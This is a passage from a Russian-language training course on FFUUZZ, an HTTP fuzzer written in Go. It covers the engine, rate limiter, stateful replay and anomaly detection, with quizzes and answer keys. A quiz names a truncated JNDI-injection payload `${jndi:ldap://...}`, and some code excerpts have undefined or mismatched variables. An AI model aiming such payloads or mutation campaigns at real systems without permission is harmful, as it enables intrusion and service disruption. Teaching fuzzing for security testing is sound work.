   - D) Глубина JSON-вложенности

4. **Вопрос (что будет, если...):** Что произойдёт, если `MaxBodyLen = 0`?
   - A) Тело не будет мутироваться
   - B) Будет использован дефолт (1MB)
   - C) Тело обрежется до 0 байт
   - D) Ошибка

5. **Вопрос:** Какой тип мутации инъектирует `${jndi:ldap://...}`?
   - A) SQL-инъекция
   - B) XSS
   - C) JNDI injection
   - D) Path traversal

**Ответы:** 1-B, 2-B, 3-B, 4-B, 5-C

## Резюме и следующие шаги

В этом модуле мы:

- Изучили pipeline-паттерн для композиции мутаторов
- Разобрали все типы мутаций (URI, headers, JSON, params, primitive, sequence)
- Поняли контроль интенсивности и воспроизводимость
- Освоили ограничения размеров

**Следующий модуль:** Движок фаззинга и воркеры — изучим оркестрацию кампаний и worker pool.

---

# Модуль 6: Движок фаззинга и воркеры

## Обзор

Этот модуль посвящён "сердцу" FFUUZZ — движку фаззинга. Мы разберём оркестрацию кампаний, worker pool, rate limiting и жизненный цикл задач.

## Цели обучения

- Понять архитектуру Engine и его роль
- Изучить жизненный цикл кампании
- Разобраться в worker pool и распределении задач
- Освоить token bucket rate limiter
- Понять корпус (corpus) и baseline-вычисления

## Основные концепции

### Архитектура Engine

**Аналогия:** Представьте ресторан:

- **Engine** = Менеджер ресторана
- **Campaign** = Смена (завтрак, обед, ужин)
- **Workers** = Повара на кухне
- **Task Channel** = Лента заказов
- **Rate Limiter** = Контроль скорости подачи блюд
- **Seeds** = Рецепты блюд

```
┌─────────────────────────────────────────────────────────────────┐
│                      FUZZ ENGINE                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │              Campaign Lifecycle                         │    │
│  │  CREATED → STARTING → RUNNING → FINISHED/STOPPED/FAILED │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
│  ┌─────────────┐     ┌─────────────┐     ┌─────────────┐        │
│  │   Seeds     │────▶│   Engine    │────▶│   Workers   │        │
│  │  (Corpus)   │     │             │     │   (Pool)    │        │
│  └─────────────┘     └──────┬──────┘     └──────┬──────┘        │
│                             │                   │               │
│                             ▼                   ▼               │
│                      ┌─────────────┐      ┌─────────────┐       │
│                      │ Rate Limiter│      │   Mutate    │       │
│                      │(Token Bucket│      │   → Replay  │       │
│                      │    RPS)     │      │   → Detect  │       │
│                      └─────────────┘      └──────┬──────┘       │
│                                                  │              │
│                                                  ▼              │
│                                           ┌─────────────┐       │
│                                           │   Finding   │       │
│                                           │  + Artifact │       │
│                                           └─────────────┘       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Token Bucket Rate Limiter

```
Bucket Capacity = burst size (например, 10)
Fill Rate = RPS (например, 50/сек)

Время ───────────────────────────────────────────────▶

Запросы:  │  │││  │    │││││  │    │││  ││
          ▼  ▼▼▼  ▼    ▼▼▼▼▼  ▼    ▼▼▼  ▼▼
Bucket:  [████████░░] [░░░░░░░░░░] [████████░░]
          8/10       0/10         7/10

Прошло:   0ms        200ms        400ms
```

## Практический разбор кода

### Engine: internal/engine/engine.go

```go
// Engine — оркестратор кампаний
type Engine struct {
    campaigns   CampaignStore
    findings    FindingStore
    artifacts   ArtifactStore
    corpus      *corpus.Manager
    artifactDir string
    logger      zerolog.Logger

    mu      sync.Mutex
    running map[string]context.CancelFunc  // campaignID → cancel
}

// StartCampaign — запускает кампанию
func (e *Engine) StartCampaign(ctx context.Context, campaign *model.Campaign) error {
    // 1. Переход CREATED → STARTING
    ok, err := e.campaigns.UpdateStatus(ctx, campaign.ID,
        campaign.Status, model.CampaignStarting)

    // 2. Загружаем сиды
    seeds, err := e.corpus.GetSeeds(ctx, campaign.ID)
    if len(seeds) == 0 {
        return fmt.Errorf("no seeds")
    }

    // 3. Вычисляем baselines
    baselineMap := corpus.ComputeBaseline(seeds)

    // 4. Создаём контекст кампании
    campCtx, cancel := context.WithCancel(context.Background())
    e.mu.Lock()
    e.running[campaign.ID] = cancel
    e.mu.Unlock()

    // 5. Переход STARTING → RUNNING
    e.campaigns.UpdateStatus(ctx, campaign.ID,
        model.CampaignStarting, model.CampaignRunning)

    // 6. Запускаем в горутине
    go e.runCampaign(campCtx, campaign.ID, campaign.Config, seeds, baselines)

    return nil
}
```

### Запуск кампании: runCampaign

```go
func (e *Engine) runCampaign(ctx context.Context, campaignID string,
    cfg model.CampaignConfig, seeds []model.RecordingSession,
    baselines map[string]*anomaly.BaselineEntry) {

    // 1. Создаём pipeline мутаций
    mutateCfg := mutate.Config{...}
    pipeline := mutate.NewPipeline(mutateCfg)

    // 2. Создаём детекторы
    detector := anomaly.NewMultiDetector(cfg.Anomaly, logger)

    // 3. Создаём triager
    triager := triage.NewTriager()

    // 4. Создаём replayer
    rep := replayer.New(nil, logger)

    // 5. Rate limiter
    limiter := NewLimiter(cfg.Limits.RPS)
    defer limiter.Close()

    // 6. Worker pool
    numWorkers := cfg.Limits.Workers
    taskCh := make(chan SeedTask, numWorkers*2)

    var wg sync.WaitGroup
    for i := 0; i < numWorkers; i++ {
        wg.Add(1)
        w := NewWorker(WorkerConfig{...})
        go func() {
            defer wg.Done()
            w.Run(ctx, taskCh)
        }()
    }

    // 7. Генератор задач
    maxTests := cfg.Limits.MaxTests
    durationSec := cfg.Limits.DurationSec
    testsGenerated := 0
    rng := rand.New(rand.NewSource(time.Now().UnixNano()))

    for {
        // Проверяем лимиты
        if maxTests > 0 && testsGenerated >= maxTests {
            break
        }
        if ctx.Err() != nil {
            break
        }

        // Rate limit
        limiter.Acquire(ctx)

        // Выбираем случайный seed
        session := seeds[rng.Intn(len(seeds))]
        seed := rng.Int63()

        // Отправляем задачу
        taskCh <- SeedTask{Session: session, MutationSeed: seed}
        testsGenerated++
    }

    // 8. Завершение
    close(taskCh)
    wg.Wait()

    // Устанавливаем финальный статус
    finalStatus := model.CampaignFinished
    if ctx.Err() != nil {
        finalStatus = model.CampaignStopped
    }
    e.campaigns.UpdateStatus(context.Background(), campaignID,
        model.CampaignRunning, finalStatus)
}
```

### Rate Limiter: internal/engine/ratelimit.go

```go
// Limiter — token bucket rate limiter
type Limiter struct {
    tokens   chan struct{}
    ticker   *time.Ticker
    stopCh   chan struct{}
}

func NewLimiter(rps int) *Limiter {
    if rps <= 0 {
        rps = 50
    }

    l := &Limiter{
        tokens: make(chan struct{}, rps),  // bucket capacity = burst
        ticker: time.NewTicker(time.Second / time.Duration(rps)),
        stopCh: make(chan struct{}),
    }

    // Заполняем bucket
    for i := 0; i < rps; i++ {
        l.tokens <- struct{}{}
    }

    // Пополняем со скоростью rps
    go func() {
        for {
            select {
            case <-l.ticker.C:
                select {
                case l.tokens <- struct{}{}:
                default:  // bucket full
                }
            case <-l.stopCh:
                return
            }
        }
    }()

    return l
}

func (l *Limiter) Acquire(ctx context.Context) error {
    select {
    case <-l.tokens:
        return nil
    case <-ctx.Done():
        return ctx.Err()
    }
}
```

### Worker: internal/engine/worker.go

```go
// SeedTask — единица работы для воркера
type SeedTask struct {
    Session      model.RecordingSession
    MutationSeed int64  // Для воспроизводимости
}

// Worker — выполняет fuzz-тесты
type Worker struct {
    id         int
    campaignID string
    baseURL    string
    pipeline   *mutate.Pipeline
    seqMutator *mutate.SeqMutator
    detector   *anomaly.MultiDetector
    triager    *triage.Triager
    replayer   *replayer.Replayer
    // ... другие поля
}

func (w *Worker) Run(ctx context.Context, taskCh <-chan SeedTask) {
    for {
        select {
        case <-ctx.Done():
            return
        case task, ok := <-taskCh:
            if !ok {
                return
            }
            w.processTask(ctx, task)
        }
    }
}

func (w *Worker) processTask(ctx context.Context, task SeedTask) {
    rng := rand.New(rand.NewSource(task.MutationSeed))

    // 1. Sequence mutation (если включена)
    entries := task.Session.Entries
    if w.seqMutator != nil && len(entries) > 1 {
        result := w.seqMutator.Mutate(entries, rng, 0.5)
        entries = result.Exchanges
    }

    // 2. Per-exchange mutations
    mutatedEntries := make([]model.Exchange, len(entries))
    for i, ex := range entries {
        ex = deepCopyExchange(ex)
        result := w.pipeline.Mutate(ex, rng, w.pipeline.Intensity())
        mutatedEntries[i] = result.Exchange
    }

    // 3. Replay
    mutatedSession := task.Session
    mutatedSession.Entries = mutatedEntries
    timeout := time.Duration(w.reqTimeoutMs) * time.Millisecond
    wctx := replayer.NewWorkerContext(timeout, w.logger)
    results, _ := w.replayer.ReplaySession(ctx, mutatedSession, w.baseURL, wctx, w.extractionRules)

    // 4. Detect anomalies
    for _, result := range results {
        baselineKey := result.Exchange.Request.Method + "|" + task.Session.Target.Path
        baseline := w.baselines[baselineKey]

        hits := w.detector.Detect(result.Exchange, result, baseline, w.anomalyCfg)
        for _, hit := range hits {
            w.handleHit(ctx, hit, mutatedSession, task.MutationSeed)
        }
    }

    // 5. Update metrics
    metrics.TestsTotal.Inc()
}
```

### Корпус и Baseline: internal/corpus/corpus.go

```go
// Manager — управляет корпусом записей
type Manager struct {
    recordings RecordingStore
    campaigns  CampaignStore
    logger     zerolog.Logger
}

// GetSeeds загружает записи для кампании
func (m *Manager) GetSeeds(ctx context.Context, campaignID string) ([]model.RecordingSession, error) {
    // Получаем recording_ids для кампании
    campaign, _ := m.campaigns.GetByID(ctx, campaignID)

    // Загружаем записи
    return m.recordings.GetByIDs(ctx, campaign.RecordingIDs)
}

// ComputeBaseline вычисляет p50 latency для каждого endpoint
func ComputeBaseline(sessions []model.RecordingSession) map[string]*model.BaselineEntry {
    groups := make(map[string][]int64)

    for _, sess := range sessions {
        for _, ex := range sess.Entries {
            key := ex.Request.Method + "|" + sess.Target.Path
            groups[key] = append(groups[key], ex.DurationMs)
        }
    }

    baselines := make(map[string]*model.BaselineEntry)
    for key, durations := range groups {
        sort.Slice(durations, func(i, j int) bool {
            return durations[i] < durations[j]
        })
        p50 := durations[len(durations)/2]

        parts := strings.Split(key, "|")
        baselines[key] = &model.BaselineEntry{
            Method:   parts[0],
            Endpoint: parts[1],
            P50Ms:    p50,
        }
    }

    return baselines
}
```

## Ключевые файлы для изучения

| Файл                           | Назначение                |
| ------------------------------ | ------------------------- |
| `internal/engine/engine.go`    | Engine и оркестрация      |
| `internal/engine/worker.go`    | Worker pool               |
| `internal/engine/ratelimit.go` | Token bucket rate limiter |
| `internal/corpus/corpus.go`    | Корпус и baseline         |

## Практические упражнения

### Упражнение 6.1: Запуск кампании через API

**Задача:** Создайте и запустите кампанию через REST API.

```bash
# 1. Импортируйте запись
curl -X POST http://localhost:8081/api/v1/recordings/import \
  -H "Content-Type: application/json" \
  -d '{
    "sessions": [{
      "schema_version": 1,
      "id": "test-session-1",
      "created_at": "2026-04-01T12:00:00Z",
      "target": {
        "scheme": "http",
        "host": "localhost",
        "port": 8080,
        "path": "/api/test"
      },
      "entries": [{
        "request_id": "20260401-test-001",
        "started_at": "2026-04-01T12:00:00Z",
        "duration_ms": 100,
        "request": {
          "method": "GET",
          "path": "/api/test",
          "headers": {}
        },
        "response": {
          "status": 200,
          "headers": {}
        }
      }]
    }]
  }'

# 2. Создайте кампанию
curl -X POST http://localhost:8081/api/v1/campaigns \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test-campaign",
    "recording_ids": ["test-session-1"],
    "config": {
      "target": {"base_url": "http://localhost:8080"},
      "limits": {"workers": 2, "rps": 10, "max_tests": 100},
      "mutations": {"intensity": 0.5}
    }
  }'

# 3. Запустите кампанию
curl -X POST http://localhost:8081/api/v1/campaigns/{id}/start
```

### Упражнение 6.2: Rate Limiter

**Задача:** Протестируйте rate limiter.

```go
func TestRateLimiter(t *testing.T) {
    limiter := NewLimiter(10)  // 10 RPS
    defer limiter.Close()

    start := time.Now()

    // Должны сразу получить 10 токенов
    for i := 0; i < 10; i++ {
        limiter.Acquire(context.Background())
    }

    // 11-й должен подождать
    limiter.Acquire(context.Background())

    elapsed := time.Since(start)
    if elapsed < 100*time.Millisecond {
        t.Error("Rate limiter not working")
    }
}
```

### Упражнение 6.3 (Challenge): Динамическое изменение RPS

**Задача:** Реализуйте rate limiter с возможностью изменять RPS на лету.

```go
type DynamicLimiter struct {
    // ...
}

func (l *DynamicLimiter) SetRPS(rps int) {
    // Реализация...
}
```

## Типичные ошибки и заблуждения

| Ошибка                    | Почему это проблема              | Как исправить                    |
| ------------------------- | -------------------------------- | -------------------------------- |
| RPS слишком высокий       | DoS на целевое приложение        | Начинайте с 10-50 RPS            |
| Workers > RPS             | Большинство воркеров простаивает | Workers ≈ RPS / 10               |
| Не проверять `ctx.Done()` | Утечка горутин                   | Всегда проверяйте контекст       |
| Забывать `close(taskCh)`  | Deadlock                         | Закрывайте канал после генерации |

## Проверка знаний

1. **Вопрос:** Какой алгоритм используется для rate limiting?
   - A) Sliding window
   - B) Token bucket
   - C) Leaky bucket
   - D) Fixed window

2. **Вопрос:** Что происходит при вызове `StopCampaign`?
   - A) Немедленное завершение
   - B) Отмена контекста, graceful shutdown
   - C) Пауза
   - D) Ничего

3. **Вопрос:** Какой метод вычисляет baseline latency?
   - A) GetSeeds
   - B) ComputeBaseline
   - C) StartCampaign
   - D) runCampaign

4. **Вопрос (что будет, если...):** Что произойдёт, если `workers = 0`?
   - A) Используется дефолт (4)
   - B) Кампания не запустится
   - C) Неограниченное количество воркеров
   - D) Ошибка

5. **Вопрос:** Зачем нужен `MutationSeed` в `SeedTask`?
   - A) Для шифрования
   - B) Для воспроизводимости мутаций
   - C) Для идентификации
   - D) Для rate limiting

**Ответы:** 1-B, 2-B, 3-B, 4-A, 5-B

## Резюме и следующие шаги

В этом модуле мы:

- Изучили архитектуру Engine и оркестрацию кампаний
- Разобрали worker pool и распределение задач
- Освоили token bucket rate limiter
- Поняли корпус и baseline-вычисления

**Следующий модуль:** Воспроизведение запросов и контекст — изучим stateful replay и переменные.

---

# Модуль 7: Воспроизведение запросов и контекст

## Обзор

Этот модуль посвящён воспроизведению HTTP-запросов и управлению состоянием между запросами в сессии (stateful replay).

## Цели обучения

- Понять архитектуру Replayer
- Изучить WorkerContext для stateful replay
- Разобраться в CookieJar (RFC 6265)
- Освоить извлечение и подстановку переменных
- Понять ExtractionRules

## Основные концепции

### Stateful vs Stateless Replay

**Аналогия:**

- **Stateless** = Каждый запрос независим (как покупка в магазине без кассира)
- **Stateful** = Запросы связаны (как сессия входа → корзина → оплата)

```
Stateless (независимые запросы):
  GET /login → 200 OK
  GET /cart  → 401 Unauthorized  (нет сессии!)
  GET /pay   → 401 Unauthorized

Stateful (с CookieJar):
  GET /login → 200 OK + Set-Cookie: session=abc
  GET /cart  → 200 OK  (автоматически отправляет Cookie: session=abc)
  GET /pay   → 200 OK  (автоматически отправляет Cookie: session=abc)
```

### Переменные и подстановки

```
Запрос 1: POST /login
Ответ 1:  {"token": "xyz123"}
         ↑ извлекаем через regex

Запрос 2: GET /api/data?token={{token}}
                              ↓ подстановка
Результат: GET /api/data?token=xyz123
```

## Практический разбор кода

### Replayer: internal/replayer/replayer.go

```go
// ExchangeResult — результат воспроизведения
type ExchangeResult struct {
    Exchange    model.Exchange  // Как отправлено (после подстановок)
    StatusCode  int
    RespHeaders http.Header
    RespBody    []byte
    DurationMs  int64
    Err         error
}

// Replayer — воспроизводит HTTP-запросы
type Replayer struct {
    DefaultClient *http.Client
    logger        zerolog.Logger
}

// ReplayExchange — однократное воспроизведение
func (r *Replayer) ReplayExchange(ctx context.Context, ex model.Exchange,
    baseURL string, wctx *WorkerContext) ExchangeResult {

    // 1. Применяем подстановки переменных
    if wctx != nil {
        wctx.ApplySubstitutions(&ex)
    }

    // 2. Строим URL
    fullURL := baseURL + ex.Request.Path
    if ex.Request.Query != "" {
        fullURL += "?" + ex.Request.Query
    }

    // 3. Декодируем тело
    var bodyReader io.Reader
    if ex.Request.BodyB64 != "" {
        bodyBytes, _ := base64.StdEncoding.DecodeString(ex.Request.BodyB64)
        bodyReader = bytes.NewReader(bodyBytes)
    }

    // 4. Создаём запрос
    req, _ := http.NewRequestWithContext(ctx, ex.Request.Method, fullURL, bodyReader)
    for k, vv := range ex.Request.Headers {
        for _, v := range vv {
            req.Header.Add(k, v)
        }
    }

    // 5. Отключаем сжатие (для читаемости)
    req.Header.Set("Accept-Encoding", "identity")

    // 6. Выбираем клиент (с CookieJar или без)
    client := r.DefaultClient
    if wctx != nil && wctx.Client != nil {
        client = wctx.Client
    }

    // 7. Выполняем запрос
    start := time.Now()
    resp, err := client.Do(req)
    elapsed := time.Since(start)

    if err != nil {
        return ExchangeResult{Exchange: ex, DurationMs: elapsed.Milliseconds(), Err: err}
    }
    defer resp.Body.Close()

    body, _ := io.ReadAll(resp.Body)

    // 8. Обновляем cookies
    if wctx != nil {
        reqURL, _ := url.Parse(fullURL)
        wctx.UpdateCookies(resp, reqURL)
    }

    return ExchangeResult{
        Exchange:    ex,
        StatusCode:  resp.StatusCode,
        RespHeaders: resp.Header.Clone(),
        RespBody:    body,
        DurationMs:  elapsed.Milliseconds(),
    }
}

// ReplaySession — последовательное воспроизведение всех exchange
func (r *Replayer) ReplaySession(ctx context.Context, session model.RecordingSession,
    baseURL string, wctx *WorkerContext, extractionRules []ExtractionRule) ([]ExchangeResult, error) {

    results := make([]ExchangeResult, 0, len(session.Entries))

    for _, ex := range session.Entries {
        // Проверяем отмену
        select {
        case <-ctx.Done():
            return results, ctx.Err()
        default:
        }

        // Воспроизводим
        result := r.ReplayExchange(ctx, ex, baseURL, wctx)
        results = append(results, result)

        // Извлекаем переменные для следующих запросов
        if wctx != nil && result.Err == nil && len(extractionRules) > 0 {
            wctx.ExtractVariables(resp, result.RespBody, extractionRules)
        }

        // Останавливаемся при ошибке
        if result.Err != nil {
            break
        }
    }

    return results, nil
}
```

### WorkerContext: internal/replayer/context.go

```go
// WorkerContext — изолированный контекст для каждой задачи
type WorkerContext struct {
    CookieJar *cookiejar.Jar      // RFC 6265 cookie jar
    Variables map[string]string   // Извлечённые переменные
    Client    *http.Client        // HTTP-клиент с jar
    logger    zerolog.Logger
}

// NewWorkerContext создаёт новый контекст
func NewWorkerContext(timeout time.Duration, logger zerolog.Logger) *WorkerContext {
    jar, _ := cookiejar.New(nil)

    return &WorkerContext{
        CookieJar: jar,
        Variables: make(map[string]string),
        Client: &http.Client{
            Timeout:   timeout,
            Jar:       jar,
        },
        logger: logger,
    }
}

// UpdateCookies — обновляет cookie jar из ответа
func (w *WorkerContext) UpdateCookies(resp *http.Response, reqURL *url.URL) {
    w.CookieJar.SetCookies(reqURL, resp.Cookies())
}

// ExtractionRule — правило извлечения переменной
type ExtractionRule struct {
    Name   string // Имя переменной для {{var}}
    Source string // "body" или "header"
    Header string // Имя заголовка (если Source == "header")
    Regex  string // Regex с capture group
}

// ExtractVariables — извлекает переменные из ответа
func (w *WorkerContext) ExtractVariables(resp *http.Response, body []byte, rules []ExtractionRule) {
    for _, rule := range rules {
        var value string

        switch rule.Source {
        case "header":
            value = resp.Header.Get(rule.Header)

        case "body":
            re := regexp.MustCompile(rule.Regex)
            matches := re.FindSubmatch(body)
            if len(matches) > 1 {
                value = string(matches[1])
            }
        }

        if value != "" {
            w.Variables[rule.Name] = value
            w.logger.Debug().Str("var", rule.Name).Str("value", value).Msg("extracted variable")
        }
    }
}

// ApplySubstitutions — подставляет {{var}} в exchange
func (w *WorkerContext) ApplySubstitutions(ex *model.Exchange) {
    for name, value := range w.Variables {
        placeholder := "{{" + name + "}}"

        // В пути
        ex.Request.Path = strings.ReplaceAll(ex.Request.Path, placeholder, value)

        // В query
        ex.Request.Query = strings.ReplaceAll(ex.Request.Query, placeholder, value)

        // В заголовках
        for k, vv := range ex.Request.Headers {
            for i, v := range vv {
                vv[i] = strings.ReplaceAll(v, placeholder, value)
            }
            ex.Request.Headers[k] = vv
        }

        // В теле
        if ex.Request.BodyB64 != "" {
            bodyBytes, _ := base64.StdEncoding.DecodeString(ex.Request.BodyB64)
            bodyStr := string(bodyBytes)
            bodyStr = strings.ReplaceAll(bodyStr, placeholder, value)
            ex.Request.BodyB64 = base64.StdEncoding.EncodeToString([]byte(bodyStr))
        }
    }
}
```

## Ключевые файлы для изучения

| Файл                            | Назначение                          |
| ------------------------------- | ----------------------------------- |
| `internal/replayer/replayer.go` | Replayer                            |
| `internal/replayer/context.go`  | WorkerContext, CookieJar, Variables |
| `internal/model/model.go`       | ExtractionRule                      |

## Практические упражнения

### Упражнение 7.1: CookieJar

**Задача:** Проверьте работу CookieJar.

```go
func TestCookieJar(t *testing.T) {
    wctx := NewWorkerContext(10*time.Second, zerolog.New(os.Stdout))

    // Симулируем Set-Cookie
    resp := &http.Response{
        Header: http.Header{
            "Set-Cookie": []string{"session=abc123; Path=/"},
        },
    }
    url, _ := url.Parse("http://example.com")

    wctx.UpdateCookies(resp, url)

    // Проверяем, что cookie сохранена
    cookies := wctx.CookieJar.Cookies(url)
    if len(cookies) == 0 {
        t.Error("Cookie not saved")
    }
}
```

### Упражнение 7.2: Подстановка переменных

**Задача:** Проверьте подстановку переменных.

```go
func TestVariableSubstitution(t *testing.T) {
    wctx := NewWorkerContext(10*time.Second, zerolog.New(os.Stdout))
    wctx.Variables["token"] = "secret123"

    ex := model.Exchange{
        Request: model.RequestData{
            Path:  "/api/data/{{token}}",
            Query: "auth={{token}}",
            Headers: map[string][]string{
                "Authorization": {"Bearer {{token}}"},
            },
            BodyB64: base64.StdEncoding.EncodeToString([]byte(`{"token":"{{token}}"}`)),
        },
    }

    wctx.ApplySubstitutions(&ex)

    // Проверяем, что все {{token}} заменены
    if strings.Contains(ex.Request.Path, "{{token}}") {
        t.Error("Path substitution failed")
    }
}
```

### Упражнение 7.3 (Challenge): JSONPath extraction

**Задача:** Добавьте поддержку JSONPath для извлечения переменных.

```go
// Добавьте в ExtractionRule:
type ExtractionRule struct {
    Name     string
    Source   string  // "body", "header", "jsonpath"
    Header   string  // для "header"
    Regex    string  // для "body"
    JSONPath string  // для "jsonpath"
}

// Реализуйте извлечение по JSONPath
func (w *WorkerContext) ExtractVariables(resp *http.Response, body []byte, rules []ExtractionRule) {
    // ...
}
```

## Типичные ошибки и заблуждения

| Ошибка                                          | Почему это проблема     | Как исправить                              |
| ----------------------------------------------- | ----------------------- | ------------------------------------------ |
| Не использовать CookieJar                       | Сессии не сохраняются   | Всегда используйте `cookiejar`             |
| Параллельное использование одного WorkerContext | Race condition          | Создавайте новый контекст на каждую задачу |
| Regex без escape                                | Неправильное извлечение | Экранируйте спецсимволы                    |
| Не проверять `ctx.Done()`                       | Утечка горутин          | Проверяйте контекст в циклах               |

## Проверка знаний

1. **Вопрос:** Зачем нужен `WorkerContext`?
   - A) Для логирования
   - B) Для изоляции состояния между задачами
   - C) Для кэширования
   - D) Для метрик

2. **Вопрос:** Какой RFC описывает CookieJar?
   - A) RFC 2616
   - B) RFC 6265
   - C) RFC 3986
   - D) RFC 3339

3. **Вопрос:** В каком порядке выполняются exchange в сессии?
   - A) Параллельно
   - B) Последовательно
   - C) Случайно
   - D) По приоритету

4. **Вопрос (что будет, если...):** Что произойдёт, если переменная не найдена?
   - A) Ошибка
   - B) Плейсхолдер останется как есть
   - C) Пустая строка
   - D) Значение по умолчанию

5. **Вопрос:** Где можно использовать `{{var}}`?
   - A) Только в path
   - B) Только в body
   - C) Path, query, headers, body
   - D) Только в headers

**Ответы:** 1-B, 2-B, 3-B, 4-B, 5-C

## Резюме и следующие шаги

В этом модуле мы:

- Изучили архитектуру Replayer
- Разобрали WorkerContext и CookieJar
- Освоили извлечение и подстановку переменных
- Поняли важность stateful replay

**Следующий модуль:** Обнаружение аномалий и триаж — изучим детекторы и алгоритмы минимизации.

---

# Модуль 8: Обнаружение аномалий и триаж

## Обзор

Этот модуль посвящён обнаружению аномалий (findings) и их обработке — подтверждению и минимизации (triage).

## Цели обучения

- Понять все типы детекторов аномалий
- Изучить механизм дедупликации через сигнатуры
- Разобраться в подтверждении находок (confirmation)
- Освоить минимизацию сессий и JSON body
- Понять reproduce worker

## Основные концепции

### Типы детекторов

**Аналогия:** Система безопасности здания:

- **TimeoutDetector** = Датчик времени ожидания (кто-то слишком долго у двери)
- **ServerErrorDetector** = Датчик тревоги (сработала сигнализация)
- **LatencyDetector** = Датчик скорости (кто-то бежит слишком быстро)
- **RegexDetector** = Распознавание лиц (найдено совпадение с базой)

### Triage-процесс

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│   Finding   │───▶│  Signature  │───▶│  Confirm    │───▶│  Minimize   │
│  Detected   │    │  (dedup)    │    │  (N runs)   │    │  (reduce)   │
└─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘
      │                  │                  │                  │
      ▼                  ▼                  ▼                  ▼
  AnomalyHit       TYPE|METHOD        ≥50% success      Минимальный
                      |PATH|                            набор для
                     HASH                               воспроизведения
```

### Минимизация (Delta Debugging)

```
Исходная сессия: [A, B, C, D, E] → находка

Шаг 1: Пробуем [A, B, C] → находка ✓ (D, E не нужны)
Шаг 2: Пробуем [A, B] → нет находки ✗
Шаг 3: Пробуем [A, C] → находка ✓ (B не нужен)

Результат: [A, C] — минимальная воспроизводящая сессия
```

## Практический разбор кода

### Детекторы: internal/anomaly/detector.go

```go
// AnomalyHit — обнаруженная аномалия
type AnomalyHit struct {
    Type       model.FindingType  // TIMEOUT, SERVER_ERROR, etc.
    Method     string
    Endpoint   string
    Details    model.FindingDetails
    Exchange   model.Exchange
    ResultBody []byte
}

// TimeoutDetector — обнаруживает таймауты
type TimeoutDetector struct{}

func (d *TimeoutDetector) Detect(ex model.Exchange, result replayer.ExchangeResult,
    _ *BaselineEntry, cfg model.AnomalyConfig) []AnomalyHit {

    if result.Err == nil {
        return nil
    }

    if isTimeoutError(result.Err) {
        return []AnomalyHit{{
            Type:     model.FindingTimeout,
            Method:   ex.Request.Method,
            Endpoint: ex.Request.Path,
            Details:  model.FindingDetails{ObservedMs: result.DurationMs},
            Exchange: ex,
        }}
    }
    return nil
}

// ServerErrorDetector — обнаруживает 5xx
type ServerErrorDetector struct{}

func (d *ServerErrorDetector) Detect(ex model.Exchange, result replayer.ExchangeResult,
    baseline *BaselineEntry, cfg model.AnomalyConfig) []AnomalyHit {

    if !cfg.Detect5xx || result.Err != nil {
        return nil
    }
    if result.StatusCode < 500 {
        return nil
    }
    // Не флагаем, если baseline тоже был 5xx
    if baseline != nil && baseline.StatusCode >= 500 {
        return nil
    }

    return []AnomalyHit{{
        Type:     model.FindingServerError,
        Method:   ex.Request.Method,
        Endpoint: ex.Request.Path,
        Details:  model.FindingDetails{HTTPStatus: result.StatusCode},
        Exchange: ex,
    }}
    return nil
}

// LatencyDetector — обнаруживает деградацию latency
type LatencyDetector struct{}

func (d *LatencyDetector) Detect(ex model.Exchange, result replayer.ExchangeResult,
    baseline *BaselineEntry, cfg model.AnomalyConfig) []AnomalyHit {

    if result.Err != nil || baseline == nil {
        return nil
    }

    threshold := int64(float64(baseline.P50Ms) * cfg.LatencyMultiplier)
    if result.DurationMs <= threshold {
        return nil
    }

    return []AnomalyHit{{
        Type:     model.FindingLatencyRegression,
        Method:   ex.Request.Method,
        Endpoint: ex.Request.Path,
        Details: model.FindingDetails{
            BaselineMs: baseline.P50Ms,
            ObservedMs: result.DurationMs,
        },
        Exchange: ex,
    }}
}

// RegexDetector — обнаруживает совпадения с паттернами
type RegexDetector struct {
    compiled []*regexp.Regexp
}

func NewRegexDetector(patterns []string, logger zerolog.Logger) *RegexDetector {
    d := &RegexDetector{}
    for _, p := range patterns {
        if re, err := regexp.Compile(p); err == nil {
            d.compiled = append(d.compiled, re)
        }
    }
    return d
}

func (d *RegexDetector) Detect(ex model.Exchange, result replayer.ExchangeResult,
    _ *BaselineEntry, _ model.AnomalyConfig) []AnomalyHit {

    if result.Err != nil || len(d.compiled) == 0 {
        return nil
    }

    for _, re := range d.compiled {
        if re.Match(result.RespBody) {
            return []AnomalyHit{{
                Type:     model.FindingRegexMatch,
                Method:   ex.Request.Method,
                Endpoint: ex.Request.Path,
                Details:  model.FindingDetails{HTTPStatus: result.StatusCode},
                Exchange: ex,
            }}
        }
    }
    return nil
}

// MultiDetector — запускает все включённые детекторы
type MultiDetector struct {
    detectors []Detector
}

func NewMultiDetector(cfg model.AnomalyConfig, logger zerolog.Logger) *MultiDetector {
    md := &MultiDetector{}
    md.detectors = append(md.detectors, &TimeoutDetector{})  // Всегда включён
    if cfg.Detect5xx {
        md.detectors = append(md.detectors, &ServerErrorDetector{})
    }
    if cfg.LatencyMultiplier > 0 {
        md.detectors = append(md.detectors, &LatencyDetector{})
    }
    if len(cfg.RegexPatterns) > 0 {
        md.detectors = append(md.detectors, NewRegexDetector(cfg.RegexPatterns, logger))
    }
    return md
}

func (md *MultiDetector) Detect(ex model.Exchange, result replayer.ExchangeResult,
    baseline *BaselineEntry, cfg model.AnomalyConfig) []AnomalyHit {

    var hits []AnomalyHit
    for _, d := range md.detectors {
        hits = append(hits, d.Detect(ex, result, baseline, cfg)...)
    }
    return hits
}
```

### Triage: internal/triage/triage.go

```go
// Triager — обрабатывает находки
type Triager struct{}

// Signature — вычисляет сигнатуру для дедупликации
// Формат: TYPE|METHOD|normalizedPath|hash(payload)
func (t *Triager) Signature(hit anomaly.AnomalyHit) string {
    normalizedPath := NormalizePath(hit.Endpoint)
    payloadHash := HashPayload(hit.Exchange.Request.BodyB64)
    return fmt.Sprintf("%s|%s|%s|%s", hit.Type, hit.Method, normalizedPath, payloadHash)
}

// Confirm — подтверждает находку N повторами
// Возвращает true, если аномалия воспроизвелась в ≥50% прогонов
func (t *Triager) Confirm(ctx context.Context, session model.RecordingSession,
    baseURL string, detector anomaly.Detector, anomalyCfg model.AnomalyConfig,
    baseline *anomaly.BaselineEntry, rep SessionReplayer, runs int,
    timeout time.Duration, logger zerolog.Logger) (bool, error) {

    if runs <= 0 {
        runs = 3
    }

    reproduced := 0
